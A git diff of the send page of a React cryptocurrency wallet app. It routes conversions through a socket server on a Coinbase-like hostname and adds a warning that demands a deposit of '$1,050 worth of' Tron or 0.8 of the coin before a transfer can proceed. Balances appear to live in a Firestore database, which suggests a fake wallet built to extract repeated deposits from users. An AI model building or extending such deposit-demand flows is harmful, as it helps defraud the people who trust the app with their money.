@@ -1,10 +1,10 @@
-import { useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import styles from "./Send.module.css";
 import HeaderBackButtonCoin from "../components/HeaderBackButtonCoin";
 import { useLocation } from "react-router-dom";
 import { Button, Option, Select, Snackbar } from "@mui/joy";
 import { useSelector } from "react-redux";
-import { CurrencyFormat, convert, updateUserBalance } from "../config/services";
+import { CurrencyFormat, updateUserBalance } from "../config/services";
 import { Typography } from "@mui/material";
 import {
   addDoc,
@@ -14,16 +14,19 @@ import {
   setDoc,
 } from "firebase/firestore";
 import { db } from "../config/firebase";
+import { io } from "socket.io-client";
+import { MaxButton } from "../components/StyledButtons";
+import { DebounceInput } from "react-debounce-input";
+import { LoaderSmall } from "../components/loader";
 
 const Send = () => {
   let { state } = useLocation();
+  const socket = useRef();
   const userInfos = useSelector((state) => state.useInfos);
-  const {
-    tron_balance,
-    eth_balance,
-    id,
-  } = userInfos;
+  const { tron_balance, eth_balance, id } = userInfos;
   const [loading, setLoading] = useState(false);
+  const [loadingConvert, setLoadingConvert] = useState(false);
+  const [loadingMax, setLoadingMax] = useState(false);
   const [value, setValue] = useState({
     amount: 0,
     coin: "",
@@ -34,6 +37,23 @@ const Send = () => {
   });
 
   const { image, coinname, code, cointype, balance } = state.coin;
+
+  useEffect(() => {
+    socket.current = io("https://coinbasesocketio.onrender.com");
+    function onConnect() {
+      console.log("connected to server");
+    }
+    function onDisconnect() {
+      console.log("socket disconnected ");
+    }
+    socket.current.on("connect", onConnect);
+
+    socket.current.on("disconnect", onDisconnect);
+    return () => {
+      socket.current.off("connect", onConnect);
+      socket.current.off("disconnect", onDisconnect);
+    };
+  }, [value]);
 
   const switchWalletBalance = (key) => {
     switch (key) {
@@ -74,40 +94,18 @@ const Send = () => {
     });
   };
 
-  const handleChangeCoin = async (event, key) => {
-    await convert.ready();
-    const isemptyvalue = event.target.value === "";
-    switch (key) {
-      case "BTC":
-        return isemptyvalue ? 0 : convert.BTC.USD(event.target.value);
-      case "ETH":
-        return isemptyvalue ? 0 : convert.ETH.USD(event.target.value);
-      case "BNB":
-        return isemptyvalue ? 0 : convert.BNB.USD(event.target.value);
-      case "TRX":
-        return isemptyvalue ? 0 : convert.TRX.USD(event.target.value);
-      case "USDT":
-        return isemptyvalue ? 0 : convert.USDT.USD(event.target.value);
-      default:
-        return isemptyvalue ? 0 : convert.USDT.USD(event.target.value);
-    }
-  };
-
-  const setMaxCoin = async (key) => {
-    await convert.ready();
-    switch (key) {
-      case "BTC":
-        return convert.USD.BTC(balance);
-      case "ETH":
-        return convert.USD.ETH(balance);
-      case "BNB":
-        return convert.USD.BNB(balance);
-      case "TRX":
-        return convert.USD.TRX(balance);
-      case "USDT":
-        return convert.USD.USDT(balance);
-      default:
-        return convert.USD.USDT(balance);
+  const setMaxCoin = () => {
+    if (balance > 0) {
+      setLoadingMax(true);
+      socket.current.emit("maxcoin", {
+        from: "USDT",
+        to: code,
+        amount: balance,
+      });
+      socket.current.on("maxcoin", (value) => {
+        setValue({ ...value, coin: value, amount: balance });
+        setLoadingMax(false);
+      });
     }
   };
 
@@ -134,7 +132,9 @@ const Send = () => {
           ...value,
           severity: "warning",
           alerMessage: `
-          You do not have enough ${selectedNetwork} to cover your network fees`,
+          You do not have enough ${selectedNetwork} to cover your network and gas fee, deposit ${
+            selectedNetwork === "Tron" ? "$1,050 worth of" : 0.8
+          } ${selectedNetwork} to proceed!`,
         });
         setOpenSnackbar(true);
         setLoading(false);
@@ -209,36 +209,48 @@ const Send = () => {
           <div className={styles.frame1}>
             <div className={styles.amount}>Enter amount in {code} value</div>
             <div className={styles.frameGroup}>
-              <input
+              <DebounceInput
+                minLength={0}
+                debounceTimeout={3000}
                 className={styles.frame2}
                 type="number"
                 name="coin"
                 placeholder="0.0000"
-                defaultValue={value.coin}
-                onChange={(event) =>
-                  handleChangeCoin(event, code).then((amount) =>
-                    setCurrency(event, amount)
-                  )
-                }
+                value={value.coin}
+                onChange={(event) => {
+                  if (event.target.value > 0) {
+                    setLoadingConvert(true);
+                    console.log(event.target.value);
+                    socket.current.emit("convert", {
+                      from: code,
+                      to: "USDT",
+                      amount: Number(event.target.value),
+                    });
+                    socket.current.on("convert", (amount) => {
+                      setCurrency(event, amount);
+                      setLoadingConvert(false);
+                    });
+                  }
+                }}
               />
-              <button
+              <MaxButton
+                loading={loadingMax}
+                text={"Max"}
                 className={styles.frame3}
-                onClick={() =>
-                  setMaxCoin(code).then((value) => {
-                    setValue({ ...value, coin: value, amount: balance });
-                  })
-                }
-              >
-                <div className={styles.max}>Max</div>
-              </button>
+                handleClick={setMaxCoin}
+              />
             </div>
             <div className={styles.amount}>
               You will receive{" "}
-              <CurrencyFormat
-                amount={value.amount}
-                prefix={"$"}
-                seperator={true}
-              />
+              {loadingConvert ? (
+                <LoaderSmall />
+              ) : (
+                <CurrencyFormat
+                  amount={value.amount}
+                  prefix={"$"}
+                  seperator={true}
+                />
+              )}
             </div>
           </div>
 
